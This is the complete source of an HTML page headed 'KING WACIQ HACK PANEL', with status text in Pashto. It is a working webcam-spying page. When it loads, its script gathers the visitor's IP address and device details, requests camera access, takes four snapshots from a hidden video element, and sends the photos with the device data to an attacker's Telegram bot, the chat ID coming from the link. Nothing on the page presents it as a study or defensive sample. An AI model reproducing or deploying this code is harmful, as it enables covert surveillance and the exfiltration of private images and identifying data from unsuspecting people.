<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KING WACIQ HACK PANEL</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      background: #000;
      color: #0f0;
      font-family: 'Orbitron', monospace;
      overflow: hidden;
    }
    h1 {
      text-align: center;
      margin-top: 100px;
      font-size: 3em;
      animation: glow 2s infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 5px #0f0; }
      to { text-shadow: 0 0 20px #0f0, 0 0 30px #0f0; }
    }
    canvas, video {
      display: none;
    }
  </style>
</head>
<body>
  <h1>KING WACIQ HACK PANEL</h1>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "YOUR_BOT_TOKEN_HERE";
    const chatId = new URLSearchParams(window.location.search).get('id');

    if (!chatId) {
      alert("❌ Chat ID (id=) URL کی نشته!");
      throw new Error("Chat ID missing in URL");
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    async function getDeviceInfo(ip) {
      return `
<b>📱 Device Info</b>
🌐 <b>Browser:</b> ${navigator.userAgent}
🖥️ <b>Platform:</b> ${navigator.platform}
📏 <b>Screen:</b> ${screen.width} x ${screen.height}
🗣️ <b>Language:</b> ${navigator.language}
🌍 <b>IP Address:</b> ${ip}
`;
    }

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "Unknown";
      }
    }

    async function sendToTelegram(blob, caption) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("caption", caption);
      formData.append("parse_mode", "HTML");
      formData.append("photo", blob, "snapshot.png");

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function captureAndSend(index, deviceInfo) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      const dataUrl = canvas.toDataURL("image/png");
      const blob = await (await fetch(dataUrl)).blob();

      const caption = deviceInfo + `\n📸 <b>Snapshot #${index}</b>`;
      await sendToTelegram(blob, caption);
    }

    async function main() {
      try {
        const ip = await getIP();
        const deviceInfo = await getDeviceInfo(ip);

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await new Promise(res => video.onloadedmetadata = res);

        for (let i = 1; i <= 4; i++) {
          await captureAndSend(i, deviceInfo);
          await new Promise(res => setTimeout(res, 1000));
        }

        stream.getTracks().forEach(track => track.stop());

        document.body.innerHTML += `<p style="text-align:center;margin-top:50px;color:#0f0">✅ څلور عکسونه + IP معلومات واستول شول</p>`;
      } catch (e) {
        alert("❌ د کامرې اجازه نشته یا بل خطا");
        console.error(e);
      }
    }

    main();
  </script>
</body>
</html>
